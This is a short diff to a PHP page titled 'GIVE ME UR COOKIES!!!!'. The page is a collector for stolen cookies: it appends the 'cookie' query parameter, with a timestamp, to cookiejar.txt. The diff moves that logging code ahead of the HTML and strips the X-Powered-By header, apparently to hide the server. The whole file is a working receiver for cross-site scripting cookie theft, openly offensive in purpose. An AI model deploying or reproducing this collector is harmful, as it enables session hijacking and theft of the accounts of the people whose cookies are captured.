@@ -1,3 +1,8 @@
+<?php
+        header_remove("X-Powered-By");
+        file_put_contents('cookiejar.txt', date('c') . " - " . $_GET['cookie'] . "\n", FILE_APPEND);
+    ?>
+    
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,8 +11,6 @@
     <title>GIVE ME UR COOKIES!!!!</title>
 </head>
 <body>
-    <?php
-        file_put_contents('cookiejar.txt', date('c') . " - " . $_GET['cookie'] . "\n", FILE_APPEND);
-    ?>
+    
 </body>
 </html>
